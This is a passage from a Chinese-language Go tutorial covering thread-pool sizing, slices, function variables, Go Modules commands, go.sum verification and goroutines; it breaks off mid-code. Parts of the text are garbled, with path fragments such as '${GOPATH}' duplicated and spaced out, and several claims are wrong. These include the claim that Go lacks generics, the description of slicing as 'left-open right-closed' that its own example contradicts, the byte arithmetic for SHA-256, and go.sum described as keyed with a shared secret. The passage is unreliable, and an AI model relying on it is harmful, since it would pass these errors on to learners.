第二天，有8本算术书(8个进程)，他们为了快速完成任务，规定一人(每个人是一个物理cpu核数)管2本算数书(单物理cpu内部实际上是管理的两个不同的算数书，也就是相当于有两个不同的逻辑cpu)，为的就是如果第一本做烦了可以换着做第2本，混合着做，最后都做完就可以。 cpu是进行最终二进制计算的核心计算器，cpu核数是有两个概念，一个是真实世界的物理硬件核数，比如4核cpu,就是有4个物理硬件内核，然而我们在生产环境的linux服务器上top的时候，出现的cpu个数实际上是逻辑cpu数，有可能linux服务器只有4核物理cpu,可是每个物理cpu分为两个逻辑cpu，这个时候我们在linux上top看的时候就是有8个cpu信息行数据。 我们回顾一下 Java，Java 运行时我们一般管理的都是线程数，而所有的 java 线程均在 JVM 这个虚拟机进程中，于是在高并发情况下，当 cpu 资源充足时，我们需要根据 cpu 的逻辑核数来确定我们的线程池线程数 (在高并发环境下一定要设置优化线程数啊！！！线程池就能设置线程数！！！)，比如我们是 4 个物理 cpu, 每个双核逻辑，一共逻辑八核 cpu, 此时，比如我们要做并发定时任务，这台服务器没有其它程序，8 个 cpu 全都给我们自己用，那么我们的线程数最少也要设置成 8，再细化，我们得根据程序执行的任务分别在 cpu 计算 (正常处理程序业务逻辑) 的耗时和 cpuIO 耗时（IO 耗时比如查 mysql 数据库数据），假如我们定时跑批任务一个任务计算用时 0.2 秒，查数据库 0.8 秒 (自己可以写程序监测)，那么可以参考如下公式： 总任务耗时 /cpu 耗时 = 多少个线程 (每个逻辑 cpu) 我们算出每个逻辑 cpu 要跑多少个线程后再乘以逻辑 cpu 的个数，就能算出来了 如下： (0.2+0.8)/0.2=5 个线程 (每个逻辑 cpu) 5*8 = 40 于是我们在线程池的时候应该这么写： 1ExecutorService fixedThreadPool = Executors.newFixedThreadPool(40); 至于公式为什么要这么写，是因为 IO 操作的时候，cpu 是空闲的，也就是说，0.8 秒数据库操作的时候，cpu 都是空闲的，那么我们就多开几个线程让 cpu 在这 0.8 秒的时候工作，开几个呢，要等 0.8 秒，一个任务 cpu 要计算 0.2 秒，0.8/0.2=4 (个)，可是这个逻辑 cpu 还有一个主线程在那 0.8 秒上等着结果呢，所以是 4+1=5（个）线程。 上述我们回顾了 Java 中的线程数和 CPU 核数相关，接下来我们来看 Go 语言。 我们下面来仔细讲讲 Go 中的 goroutine (实际是协程)，是如何天然的支持高并发的，它与 Java 中的线程 Thread 又有什么区别，为什么它比线程能更好的支持高并发。 # 44. 初始化结构体，匿名结构体，结构体指针 (再讲) # 45. 方法中的值接收和指针接收的区别 (方法进阶细节讲解) 我们之前讲了如果给一个类型绑定上一个接受者，就可以为这个类型添加一个这个类型独有的函数，只有这个类型对象自己能调用的函数，这个特殊的函数叫方法。 现在，我们讲一下方法关于传递接受者（自身引用）的进阶玩法。 Go 语言中的参数传递 # 46. 基于包模块的 Init 函数 # 47.Go 语言中的初始化依赖项 # 48.slice 相关知识点 slice 的中文意思是切片。 要想理解切片，我们首先要理解数组。 数组是一个长度不能变化的容器，存储同一数据类型的数据。 比如：int 数组 1[1,2,3,4,5,6] 切片是对数组中一截，一小段，一个子集的地址的截取，切片存储的是它指向的底层数组中的一小截数据的地址，切片中不存数据，创建切片也不会把数组中的数据 copy 一份，切片只是存储着数组中一部分连续的数据的地址，切片的每一个元素实际上都指向具体的数组的中一个元素。 切片内部包含三个元素： 1. 底层数组（它指向的是哪一个数组） 我们要理解底层数组是什么，先举例： [1,2,3] 这是一个 int 数组，其中元素 1 的地址是 0x0001, 元素 2 的地址是 0x0002，元素 3 的地址是 0x0003。 那么如果我们创建一个通过数组 [1,2,3] 创建一个切片 x。 这个 x 里面存储的并不是拷贝的另外一份新的 [1,2,3]。 切片 x 实际上是这样子的： [0x0001,0x0002,0x0003] 当我们取出 x [0] 的时候，它操作的实际上是 0x0001 这个地址的元素，而这个地址实际上就是数组 [1,2,3] 中的 1 的地址。 也就是说，当我们修改了数组 [1,2,3] 中的 1 后，比如 0x0001 = 5 , 切片 x 中的 0 元素的取值自动也不一样了，因为 0x0001 地址上存储的 值已经被改成 5 了，而 x [0] 实际上还是 0x0001, 所以此时取出 x [0], 得到的就是 5。 切片存储的每一个元素实际上是它指向的底层数组的每一个元素的地址。 也就是说切片是一个引用类型，它不存储元素，不拷贝元素，它存储数组元素的引用，通过修改切片会修改原来数组的值。 2. 切片的长度 这个切片中有有几个元素，指向了数组中的几个连续的元素。 3. 切片的容量 从切片在底层数组的起始下标 (切片的首个元素) 到底层数组的最后一个元素，一共有几个元素，切片的容量就是几。 例如：(下面先用伪代码示例，后面有具体可执行代码) 原数组：a = [1,2,3,4,5,6,7,8] 切片: b = a [2:5] 从数组 a 的下标为 2 的开始，也就是具体数值是 3 开始，截取到下标为 5，下标为 5 的是 6，因为切片截取是左开右闭，所以切片中包括下标为 2 的数值 3，不包含下标为 5 的数值 6。 切片存储的地址指向的数据是：[3,4,5] 因为 3，4，5 有三个数，所以切片的长度是 3。 因为从切片的起始元素 3 到底层数组的末尾元素 8 之间有 6 个元素，所以切片的容量是 6。 修改切片实际上是修改切片指向的底层数组中的值。 # 49.Go 中类似于函数指针的功能 Go 中要实现函数指针非常简单。 因为 Go 中的函数也是一种类型。 所以我们只要声明一个变量，把某一个函数赋值给这个变量，就能实现函数指针的效果。 如下代码示例： 1234567891011121314151617181920212223package mainimport &quot;fmt&quot;//加法func myAddFun(x,y int) int { return x+y}//减法func mySubFun(x,y int ) int{ return x-y;}//函数变量(类似于函数指针)var myPointFun func(x,y int) intfunc main() { //加法函数赋值给该函数变量，相当于函数指针指向加法函数 myPointFun = myAddFun fmt.Printf(&quot;a+b = %d\\n&quot;,myPointFun(10,20)) //减法函数赋值给该函数变量，相当于函数指针指向减法函数 myPointFun = mySubFun fmt.Printf(&quot;a-b = %d\\n&quot;,myPointFun(100,50))} 输出： 123a+b = 30a-b = 5012 # 50.Go 有没有注解 原生的 Go 语言的 SDK 是不支持注解功能的，但是有一些其它的第三方机构为了实现自己的某些功能需求编写了一些自定义的注解。 # 51.Go 不能做大数据相关的开发 因为大数据的一些底层都是 Java 开发的，用 Java 实现接口开发功能非常方便快捷，对于 Go 语言的支持包比较少，另外就是一些算法库像 numpy,pandas 和一些机器学习，深度学习算法库 Python 支持的比较好，对于 Go 的支持很不好。 # 52.Go 没有泛型 Go 中不支持泛型 (明确) # 53.Go 如何产生随机数 (随机数和种子) # 54.Go 如何打类似于 (java jar 那种依赖包).a 的工具依赖包 (有了 Module 后不用这个了) Go 中也有很多通过命令来完成辅助开发的工具，就像 Java 中 jdk 中的 java javac javap 等指令那种命令工具。 比如有 go build xxx 命令，go clean xxx 命令， go run xxx 命令… Java 中打 jar 包可以通过 IDEA 集成开发环境图形界面化直接打包，也可以使用 jar 命令在命令行操作中 (使用不同的参数) 进行打包。 与 java jar 命令打包对应的 Go 的命令是 go install, 这个 go install 也类似于 maven 中的 install, 它会把打成的.a 后缀名结尾的工具包文件 放入 ${GOPATH} /pkg 下。 具体使用如下示例： 注意：使用 go install 之前必须在操作系统的环境变量中定义 ${GOPATH} 这个环境变量 1. 查看我们当前的操作系统中环境变量有没有定义 GOPATH。 2. 查看 ${GOPATH} 目录下是否有 src,pkg,bin 目录，并且保证我们的代码是在 src 下的。 3. 打开一个命令行窗口，比如 windows 是 cmd 打开一个 dos 窗口。 4. 我们在最开始之前已经把 go 的安装包下的包含 Go 操作指令的 bin 目录配置在了 PATH 环境变量中，所以此时我们可以不用管目录直接使用 go install 命令。 例如目录结构如下： 1com.mashibing.gotest -------------------------mygopackge MyUtil.go 1记住一点，此时MyUtil中不能是main包，也不能有main函数，否则打不出来.a结尾的依赖包。 此时编写执行命令： 1go install com/mashibing/gotest/mygopackge 此指令运行时，首先会去找 ${GOPATH} 目录 然后把后面的 com/mashibing/gotest/mygopackge 拼接上去 也就是 ${GOPATH}/com/mashibing/gotest/mygopackge 然后会把 ${GOPATH}/com/mashibing/gotest/mygopackge 下的所有.go 文件，比如 MyUtil.go 全部打包压缩进 mygopackge.a 文件 最后会把 mygopackage.a 放入 G O P A T H /p k g / {GOPATH}/pkg/GOPAT**H/pkg/{标示操作系统的一个名字 (这个不重要)}/com/mashibing/gotest/ 下。 最终.a 文件存储的结构是这样的： ${GOPATH}/pkg/com/mashibing/gotest/mygopackge.a # 55.Go 中的依赖管理 Module 使用 # 1. 什么是 GoModule?(Go 中 Module 和包的区别？) 首先我们要理解一下 Go 的 Module 是一个什么概念？ 我先简单的说一下，Go 中的 Module 是 GoSDK1.11 后提出的一个新的类似于包的机制，叫做模块，在 1.13 版本后成熟使用，GoSDK 中 Module 功能是和相当于一个包的增强版，一个模块类型的项目在根目录下必须有一个 go.mod 文件，这个模块项目内部可以有很多个不同的包，每个包下有不同的代码，我们下载依赖的时候是把这个模块下载下来 (模块以压缩包 (比如 zip) 的形式存储在 G O P A T H /p k g /m o d /c a c h e / 下，源码文件也会在 {GOPATH}/pkg/mod/cache/ 下，源码文件也会在 GOPAT**H/pkg/mod/cache / 下，源码文件也会在 {GOPATH}/pkg/mod/ 下)。 我们导入模块的时候只需要引入一次，使用模块中不同的包的时候可以通过 import 模块下不同的包名，来引入不同包的功能。 比如下面的结构 -----------com.mashibing.module -----------------------package1 --------------test1.go ------------------------package2 -------------test2.go 然后我们只需要在 go.mod 中引入这一个模块，就能在 import 的时候任意引入 package1 或 package2。 # 2. 为什么要使用 GoModule? # 1). 团队协作开发中对于包的版本号的管理 在没有 Module 之前，我们都是把自己写的 Go 程序打成包，然后别的程序引用的话引入这个包。 可是在开发中这些包的版本有个明显的不能管理的问题。 比如我怎么知道这个包是今天开发的最新版还是明天开发的，我在团队协同开发中怎么把别人写的最新版本的包更新到我的项目中。 # 2）便于开发中的依赖包管理 其次，我们在开发中下载了别人的项目，怎么快速的观察有哪些依赖包，如何快速的把所有依赖包从仓库中下载下来，都是一个问题， 这两个问题就可以通过观察项目根目录下的 go.mod 文件的依赖模块列表和执行 go mod download 命令快速从第三方模块仓库中下载依赖包来完成。 # 3). 隔离管理不同类别的项目 有了 Module 后，我们可以把我们自己的项目和系统的项目隔离管理，我们的项目不用必须放在 ${GOPATH}/src 下了 # 3. 哪些项目能使用 GoModule? 一个 GoModule 项目要想引入其它依赖模块，需要在根目录下的 go.mod 中添加对应的依赖模块地址。 注意：！！！重点来了！！！ GoModule 只能引用同样是 Module 类型的项目，经常用于引用内部自己的项目。 像 maven 仓库一样引用开源模块的依赖也是一个特别常用的场景。 不过我们需要修改代理地址访问国内的第三方 GoModule 提供商。 https://goproxy.cn/ 是一个国内的可访问的 GoModule 依赖仓库，类似于 Java 中 maven 中央仓库的概念。 # 4.GoModule 的版本问题？ 我们使用 Go module 之前，首先要保证我们的 Go SDK 是在 1.13 以及以上版本。(Go1.11 以上就可以使用 Module, 但是需要设置一些开启等，1.13 后默认开启) 因为在 1.13 版本上官方正式推荐使用，成为稳定版了。 Go 也有代码仓库，比如可以使用 github 作为 go 项目的代码仓库，Go 语言本身就提供了一个指令 go get 来从指定的仓库中 拉取依赖包和代码，不过 go get 这个指令在开启模块功能和关闭模块功能下用法不一样，下面有开启模块下的用法。 # 5.GoModule 和 Java 中 Maven 的区别？ Go 中的 Module 和 Java 中的 Maven 不同： 首先，Module 是官方的 SDK 包自带的，它并非像 maven 一样还得安装 maven 插件之类的。 关于中央依赖仓库，Go 和 Java 中的概念是类似的，都是国内的第三方提供的。 # 6. 如何开启 GoModule?(GO111MODULE) 具体我们如何使用 Module 呢？ 我们首先要检查我们的 GoSDK 版本是 1.11 还是 1.13 之上。 如果是 1.11 的话我们需要设置一个操作系统的中的环境变量，用于开启 Module 功能，这个是否开启的环境变量名是 GO111MODULE， 他有三种状态： 第一个是 on 开启状态，在此状态开启下项目不会再去 ${GOPATH} 下寻找依赖包。 第二个是 off 不开启 Module 功能，在此状态下项目会去 ${GOPATH} 下寻找依赖包。 第三个是 auto 自动检测状态，在此状态下会判断项目是否在 G O P A T H /s r c 外，如果在外面，会判断项目根目录下是否有 g o . m o d 文件，如果均有则开启 M o d u l e 功能，如果缺任何一个则会从 {GOPATH}/src 外，如果在外面，会判断项目根目录下是否有 go.mod 文件，如果均有则开启 Module 功能，如果缺任何一个则会从 GOPAT**H/src 外，如果在外面，会判断项目根目录下是否有 g**o.mod 文件，如果均有则开启 Modul**e 功能，如果缺任何一个则会从 {GOPATH} 下寻找依赖包。 GoSDK1.13 版本后 GO111MODULE 的默认值是 auto，所以 1.13 版本后不用修改该变量。 注意：在使用模块的时候， GOPATH 是无意义的，不过它还是会把下载的依赖储存在 ${GOPATH}/src/mod 中，也会把 go install 的结果放在 ${GOPATH}/bin 中。 windows 1set GO111MODULE=on linux 1export GO111MODULE=on # 7.GoModule 的真实使用场景 1： 接下来我们代入具体的使用场景： 今天，小明要接手一个新的 Go 项目，他通过 GoLand 中的 git 工具，从公司的 git 仓库中下载了一个 Go 的项目。(下载到他电脑的非 ${GOPATH}/src 目录，比如下载到他电脑的任意一个自己的工作空间) 此时他要做的是： 1). 先打开项目根目录下的 go.mod 文件看看里面依赖了什么工具包。(这个就是随便了解一下项目) 2).Go 的中央模块仓库是 Go 的官网提供的，在国外是 https://proxy.golang.org 这个地址，可是在国内无法访问。 我们在国内需要使用如下的中央模块仓库地址：https://goproxy.cn 我们 Go 中的 SDK 默认是去找国外的中央模块仓库的，如何修改成国内的呢？ 我们知道，所有的下载拉取行为脚本实际上是从 go download 这个脚本代码中实现的，而在这个脚本中的源码实现里，肯定有一个代码是写的是取出操作系统中的一个环境变量，这个环境变量存储着一个地址，这个地址代表了去哪个中央模块仓库拉取。 在 GoSDK 中的默认实现里，这个操作系统的环境变量叫做 GOPROXY，在脚本中为其赋予了一个默认值，就是国外的 proxy.golang.org 这个值。 我们要想修改，只需要在当前电脑修改该环境变量的值即可： (注意，这个变量值不带 https, 这只是一个变量，程序会自动拼接 https) windows 1set GOPROXY=goproxy.cn linux 1export GOPROXY=goproxy.cn 3). 切换到项目的根目录，也就是有 go.mod 的那层目录，打开命令行窗口。 执行 download 指令 (下载模块项目到 ${GOPATH}/pkg/mod 下) 1go mod download 4). 如果不报错，代表已经下载好了，可以使用了，此时在项目根目录会生成一个 go.sum 文件。 一会再讲解 sum 文件。 5). 此时可以进行开发了。 # 8.GoModule 的真实使用场景 2： 场景 2：我们如何用命令创建一个 Module 的项目，(开发工具也能手动创建)。 切换到项目根目录，执行如下指令： 1go mod init 模块名(模块名可不写) 然后会在根目录下生成一个 go.mod 文件 我们看看这个 go.mod 文件长啥样？ 1234// 刚才init指令后的模块名参数被写在module后了module 模块名//表示使用GoSDK的哪个版本go 1.14 修改 go.mod 文件中的依赖即可。 我们有两种方式下载和更新依赖： 1. 修改 go.mod 文件，然后执行 go mod down 把模块依赖下载到自己 ${GOPATH}/pkg/mod 下，这里面装的是所有下载的 module 缓存依赖文件，其中有 zip 的包，也有源码，在一个项目文件夹下的不同文件夹下放着，还有版本号文件夹区分，每个版本都是一个文件夹。 2. 直接在命令行使用 go get package@version 更新或者下载依赖模块，升级或者降级模块的版本。(这里是开启模块后的 go get 指令用法) 例如： 1go get github.com/gin-contrib/sessions@v0.0.1 这个指令执行过后，会自动修改 go.mod 中的文件内容，不需要我们手动修改 go.mod 文件中的内容。 # 9.go.mod 文件详解 接下来我们讲讲核心配置文件 go.mod go.mod 内容如下： 12345678910111213141516171819202122232425262728293031//表示本项目的module模块名称是什么,别的模块依赖此模块的时候写这个名字module test//表示使用GoSDK的哪个版本go 1.14//require中声明的是需要依赖的包和包版本号require ( //格式如下： 需要import导入的模块名 版本号 // 需要import导入的模块名2 版本号2 // ... ... github.com/gin-contrib/sessions v0.0.1 github.com/gin-contrib/sse v0.1.0 // indirect github.com/gin-gonic/gin v1.4.0 github.com/go-redis/redis v6.15.6+incompatible github.com/go-sql-driver/mysql v1.4.1 github.com/golang/protobuf v1.3.2 // indirect github.com/jinzhu/gorm v1.9.11 github.com/json-iterator/go v1.1.7 // indirect github.com/kr/pretty v0.1.0 // indirect github.com/mattn/go-isatty v0.0.10 // indirect github.com/sirupsen/logrus v1.2.0 github.com/ugorji/go v1.1.7 // indirect)//replace写法如下，表示如果项目中有引入前面的依赖模块，改为引用=&gt;后面的依赖模块，//可以用于golang的国外地址访问改为指向国内的github地址,当然你在上面require直接写github就不用在这里repalce了replace ( golang.org/x/crypto v0.0.0-20190313024323-a1f597ede03a =&gt; github.com/golang/crypto v0.0.0-20190313024323-a1f597ede03a)//忽略依赖模块，表示在该项目中无论如何都使用不了该依赖模块，可以用于限制使用某个有bug版本的模块exclude( github.com/ugorji/go v1.1.7 ) 注：go.mod 提供了 module, require、replace 和 exclude 四个命令 module 语句指定包的名字（路径） require 语句指定的依赖项模块 replace 语句可以替换依赖项模块 exclude 语句可以忽略依赖项模块 上面 github.com/ugorji/go v1.1.7 //indirect 有 indirect 和非 indirect indirect 代表此模块是间接引用的，中间隔了几个项目 这个不用特殊写，可以注释写便于识别和开发 # 10.GoModule 有哪些命令？如何使用？ Go 有如下关于 Module 的命令： 123456789//go mod 命令：download //下载依赖模块到${GOPATH}/pkg/modedit //一系列参数指令用于操作go.mod文件，参数太多，具体下面有例子graph //输出显示每一个模块依赖了哪些模块init //在一个非module项目的根目录下创建一个go.mod文件使其变为一个module管理的项目tidy //根据项目实际使用的依赖包修改(删除和添加)go.mod中的文本内容vendor //在项目根目录创建一个vender文件夹 然后把${GOPATH}/pkg/mod下载的本项目需要的依赖模块拷贝到本项目的vender目录下verify //校验${GOPATH}/pkg/mod中的依赖模块下载到本地后是否被修改或者篡改过why //一个说明文档的功能，用于说明一些包之间的为什么要这么依赖。(没啥用) # 0). init 和 download 我们之前在案例中讲了 init,download 指令，这里不再赘述 # 1).go mod edit 是指在命令行用指令通过不同的参数修改 go.mod 文件，这个指令必须得写参数才能正确执行，不能空执行 go mod edit 参数 1 ：-fmt 1go mod edit -fmt 格式化 go.mod 文件，只是格式规范一下，不做其它任何内容上的修改。 其它任何 edit 指令执行完毕后都会自动执行 - fmt 格式化操作。 这个使用场景就是我们如果不想做任何操作，就想试试 edit 指令，就只需要跟上 - fmt 就行，因为单独不加任何参数 只有 go mod edit 后面不跟参数是无法执行的。 我们如何升级降级依赖模块的版本，或者说添加新的依赖和移除旧的依赖呢 参数 2： -require=path@version /-droprequire=path flags 添加一个依赖 1go mod edit -require=github.com/gin-contrib/sessions@v0.0.1 删除一个依赖 1go mod edit -droprequire=github.com/gin-contrib/sessions@v0.0.1 这两个和 go get package@version 功能差不多，但是官方文档更推荐使用 go get 来完成添加和修改依赖（go get 后的 package 和上面的 path 一个含义，都是模块全路径名） 参数 3：-exclude=path@version and -dropexclude=path@version 排除某个版本某个模块的使用，必须有该模块才可以写这个进行排除。 1go mod edit -exclude=github.com/gin-contrib/sessions@v0.0.1 删除排除 1go mod edit -dropexclude=github.com/gin-contrib/sessions@v0.0.1 简单来说，执行这两个是为了我们在开发中避免使用到不应该使用的包 … 还有好几个，基本很少用，省略了 # 2).go mod graph 命令用法： 输出每一个模块依赖了哪些模块 无参数，直接使用 ，在项目根目录下命令行执行 1go mod graph 比如： 模块 1 依赖了模块 a 模块 1 依赖了模块 b 模块 1 依赖了模块 c 模块 2 依赖了模块 x 模块 2 依赖了模块 z 如下是具体例子： 12345678910111213C:\\${GOPAHT}\\file\\project&gt;go mod graphfile\\project github.com/edgexfoundry/go-mod-bootstrap@v0.0.35github.com/edgexfoundry/go-mod-bootstrap@v0.0.35 github.com/BurntSushi/toml@v0.3.1github.com/edgexfoundry/go-mod-bootstrap@v0.0.35 github.com/edgexfoundry/go-mod-configuration@v0.0.3github.com/edgexfoundry/go-mod-bootstrap@v0.0.35 github.com/edgexfoundry/go-mod-core-contracts@v0.1.34github.com/edgexfoundry/go-mod-bootstrap@v0.0.35 github.com/edgexfoundry/go-mod-registry@v0.1.17github.com/edgexfoundry/go-mod-bootstrap@v0.0.35 github.com/edgexfoundry/go-mod-secrets@v0.0.17github.com/edgexfoundry/go-mod-bootstrap@v0.0.35 github.com/gorilla/mux@v1.7.1github.com/edgexfoundry/go-mod-bootstrap@v0.0.35 github.com/pelletier/go-toml@v1.2.0github.com/edgexfoundry/go-mod-bootstrap@v0.0.35 github.com/stretchr/testify@v1.5.1github.com/edgexfoundry/go-mod-bootstrap@v0.0.35 gopkg.in/yaml.v2@v2.2.8github.com/edgexfoundry/go-mod-configuration@v0.0.3 github.com/cenkalti/backoff@v2.2.1+incompatiblegithub.com/edgexfoundry/go-mod-configuration@v0.0.3 github.com/hashicorp/consul/api@v1.1.0 # 3).go mod tidy 根据实际项目使用到的依赖模块，在 go.mod 中添加或者删除文本引用 有一个参数可选项 -v 输出在 go.mod 文件中删除的引用模块信息 比如我们项目用到一个模块，go.mod 中没写，执行后 go.mod 中就会添加上该模块的文本引用。 如果我们在 go.mod 中引用了一个模块，检测在真实项目中并没有使用，则会在 go.mod 中删除该文本引用。 使用如下： 1go mod tidy -v 输出： 1unused github.com/edgexfoundry/go-mod-bootstrap 输出表示检测项目没有使用到该模块，然后从 go.mod 中把该包的引用文字给删除了。 # 4).go mod vender 该指令会在项目中建立一个 vender 目录，然后把 ${GOPATG}/pkg/mod 中下载的依赖拷贝到项目的 vender 目录中，方便管理和方便在 idea 中引用依赖。 -v 参数可以在控制台输出相关的结果信息 1go mod vender -v # 5).go mod verify 验证下载到 ${GOPATH}/pkg/mod 中的依赖模块有没有被修改或者篡改。 结果会输出是否被修改过 1go mod verify 比如输出： 1all modules verified 这个是所有模块已经验证，代表没有被修改，如果被修改，会提示哪些被修改。 # 6).go mod why 这个没啥用，说白了就是一个解释文档，输入参数和依赖他说明哪些包为啥要依赖这些包，不用看它，用处不大。 # 11.go.sum 详细讲解 # 1).go.sum 什么时候会更新或者新建生成？ 当我们通过 go mod download 下载完依赖模块或者 go get package@version 更新了依赖包的时候 ，会检查根目录下有没有一个叫 go.sum 的文件，没有的话则创建一个并写入内容，有的话会更新 go.sum 中的内容。 # 2).go.sum 是用来做什么的？ go.sum 的作用是用来校验你下载的依赖模块是否是官方仓库提供的，对应的正确的版本的，并且中途没有被黑客篡改的。 go.sum 主要是起安全作用和保证依赖的版本肯定是官方的提供的那个版本，版本确认具体是确认你下载的那个模块版本里面的代码的和官方提供的模块的那个版本的代码完全相同，一字不差。 通过 go.sum 保证安全性是很有必要的，因为如果你的电脑被黑客攻击了，黑客可以截取你对外发送的文件，也可以修改发送给你的文件，那么就会产生一个问题： 本来的路径应该是这样的： 第三方模块依赖库 ------------&gt; 你的电脑 结果中间有黑客会变成这样: 第三方模块依赖库 --------&gt; 黑客修改了依赖库中的代码，植入病毒代码，并重新打成模块发送给你 ---------&gt; 你以为是官方的版本 结果黑客就把病毒代码植入到了你的项目中，你的项目就不安全了，面临着数据全部泄露的风险。 # 3).go.sum 是如何实现校验机制的？它包含什么内容？ 说到校验安全机制，有一种常规的玩法就是使用不可逆加密算法，不可逆加密算法是指将 a 文本通过算法加密成 b 文本后，b 文本永远也不能反着计算出 a 文本。 不可加密算法的具体是怎么应用的呢？它是如何起作用的？ 我们在这里先讲一个不可逆的加密算法 SHA-256 算法。 SHA-256 算法的功能就是将一个任意长度的字符串转换成一个固定长度为 64 的字符串，比如: 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce 这里从 4e07 代表四个字符串，按此算，这个加密后的字符串为 64 个。 为什么是 64 个呢？ 因为 64 个字符串每两个字符为一组，比如 4e 是一组，07 是一组，也就是说有 32 组，每一组是一个十六进制的数值，一个十六进制的数值也就是两个字符用计算机中的 8 个字节内存空间存储，也就是一个十六进制的数字，有两个字符串，占 8 个字节，一个字节等同 8 位 (bit)(位只能存储 0 和 1 两个值)，也就是说: 32（32 个十六进制数，每个十六进制数用两个字符表示）*8 字节 = 256 位。 仔细看名字，SHA 代表是算法的加密方式类型，256 代表的是他这个是 256 位的版本。 具体原理实现是 SHA 内部定义了一系列固定数值的表，然后加密的时候无论是需要加密多少文字，它都按照一定的规则从需要加密的文字中按一定规则抽取其中的缩略一部分，然后拿缩略的一部分和 SHA 内部的固定数值表进行固定的 hash 映射和算术操作，这个 hash 映射和算术操作的顺序是固定写死的，公共数据表是写死的，这个写死的顺序和公共数据表就是这个算法的具体内容本质。 这样的话，因为抽取的是缩略的内容，所以我们可以把输出结果固定在 64 个字符，256 位。 因为是缩略的内容， 所以我们不可能通过缩略的内容反推出完整的结果。 但是，相同的文本按照这个算法加密出来的 64 个字符肯定是相同的，同时，只要改变原需要加密文本的一个字符，也会造成加密出来的 64 个字符大不相同。 我们用 SHA-256 通常是这么用的： A 方 要 发送信息给 B 方 B 方 要确定信息是 A 方发送的，没有经过篡改 此时 A 和 B 同时约定一个密码字符串，比如 abc。 这个 abc 只有 A 方和 B 方知道。 A 方把 需要传输的文本拼接上 abc，然后通过 SHA-256 加密算出一个值，把原文本和算出的值全部发送给 B。 B 方 拿出原文本，拼接上 abc，进行 SHA256 计算，看看结果是否和传输过来的 A 传输的值一样，如果一样，代表中间没有被篡改。 为什么呢？ 因为如果有一个黑客 C 想要篡改，他就得同时篡改原文本和算出的签名值。 可是 C 不知道密码是 abc，它也就不能把 abc 拼接到原文后，所以它算出来的签名和 B 算出来的签名肯定不一致。 所以 B 如果自己算出的签名值与接收到的签名值不一致，B 就知道不是 A 发过来的，就能校验发送端的源头是否是官方安全的了。 接下来我们讲一下 go.sum 的验证机制。 首先说下 go.sum 中存储的内容，这个文件存储的每一行都是如下格式 模块名 版本号 hash 签名值 示例： 123github.com/google/uuid v1.1.1 h1:Gkbcsh/GbpXz7lPftLA3P6TYMwjCLYm83jiFQZF/3gY= github.com/google/uuid v1.1.1/go.mod h1:TIyPZe4MgqvfeYDBFedMoGGpEw/LqOeaOT+nhxU+yHo= 这里的 hash 签名值是拿当前模块当前版本号内的所有代码字符串计算出来的一个值，就是通过上面讲解的 SHA-256 计算的。 所以哪怕是这个模块中的代码有一个字变了，计算出来的 hash 值也不相同。 第三方模块库在每发布一个新的模块版本后，会按照 SHA-256 计算出对应版本的 hash 值，然后提供给外部获取用于检验安全性。 当我们 go mod download 和 go get package@version 后 会更新 go.mod 中的模块路径和版本。 然后会更新或者创建根目录下 go.sum 文件中的模块名 版本号 和 hash 值。 在 go.sum 中的 hash 值是在下载和更新依赖包的时候，同时获取官方提供的版本号得来的。 也就是说，基本上 go.sum 中的文件都是从官网（外国）（中国是第三方模块仓库）上获得的正品版本号，这个版本号是仓库方自己算的，你只是获取到了存储到你自己的 go.sum 中。 具体如何获取版本号有个小知识点： 1go module机制在下载和更新依赖的时候会取出操作系统中名为`GOSUMDB`的环境变量中的值，这个服务器地址值代表了从哪个第三方仓库获取对应的正品版本号。 重点来了，当你在 go build 打包创建 go 项目的时候，go build 的内部指令会去拿你本地的模块文件进行 SHA-256 计算，然后拿到一个计算出来的结果值，之后它会拿此值和 go.sum 中的正确的从官网拉取的值进行对比，如果不一样，说明这个模块包不是官方发布的，也就是你本地的模块包和官方发布的模块包中的代码肯定有差异。 # 四。专门详解 Go 并发编程相关知识 # 1.Go 为什么天然支持高并发，纤程比线程的优势是什么？ Go 语言在设计的时候就考虑了充分利用计算机的多核处理器，具体表现为，Go 中开启一个并发的任务以操作系统的线程资源调度为单位的，而是 Go 的创造者们自己写了一套管理多个任务的机制，在这个机制下，每一个并发的任务线程叫做纤程，这个纤程的作用等同一个线程，也是并发执行的，只不过纤程是在应用程序管理的，懂底层的可以讲是在用户态的一个线程，而 Java 中调度的线程是属于操作系统，也就是操作系统内核态的线程。 用户态的纤程归属于用户编写的软件管理和调度，优点是可以根据情况灵活实现堆栈的内存分配，最优化其中的运行资源配置。 内核态的线程归属于操作系统调度和管理，他底层是有 windows 或者 linux 操作系统底层的代码管理的，那么他就不灵活，每个线程分配的资源可能造成浪费，创建的线程数肯定也有一定的限制。 Go 的创造可以为自己的语言和任务灵活配置资源，Linux 和 windows 操作系统的代码是通用的，总不能为你这个语言修改源代码把。 在实际程序运行中，一个操作系统的内核态线程可能管理着好几个甚至数十个纤程 (根据实际情况和设置不同而不同)，所以省去了线程时间片上下文切换的时间。 同时因为内部机制灵活，所以执行效率高，占用内存也少。 这就是 Go 语言的并发优势的核心所在。 # 2. 并发和并行的区别？ 并发是指的一个角色在一段时间内通过来回切换处理了多个任务。 并行是指两个或者多个角色同时处理自己的任务。 举例： 并发：在一个小时内，你写了 10 分钟语文作业，又写了 10 分钟数学，之后又写了 10 分中英语作业，然后再从语文 10 分钟，数学 10 分钟，英文 10 分钟又来一次。 这个叫做你并发的写语文数学英语作业。 你一个一段时间（一个小时内）通过切换（一会写数学，一会写语文。。。），处理了多个任务（写了三门课的作业） 并行：你和小明同时写自己的作业。你们俩同时运行的状态叫做并行运作状态，强调的是你们两个人同时在处理任务 (做作业)。 你和小明 (两个以上的角色) 同时写作业 (处理自己的任务)。 在计算机中，比如有 4 个 cpu，4 个 cpu 同时工作，叫做这 4 个 cpu 并行执行任务，每个 cpu 通过时间片机制上下文切换处理 100 个小任务，叫做每个 cpu 并发的处理 100 个任务。 # 3.Go 是如何用 Channel 进行协程间数据通信数据同步的？ go 中的线程相关的概念是 Goroutines (并发)，是使用 go 关键字开启。 Java 中的线程是通过 Thread 类开启的。 在 go 语言中，一个线程就是一个 Goroutines，主函数就是（主） main Goroutines。 使用 go 语句来开启一个新的 Goroutines 比如： 普通方法执行 myFunction() 开启一个 Goroutines 来执行方法 go myFunction() java 中是 new Thread(()-&gt;{ // 新线程逻辑代码 }).start(); 参考下面的代码示例： 12345678910111213141516171819202122232425262728293031package mainimport ( &quot;fmt&quot;)//并发开启新线程goroutine测试//我的方法func myFunction() { fmt.Println(&quot;Hello!!!&quot;)}//并发执行方法func goroutineTestFunc() { fmt.Println(&quot;Hello!!! Start 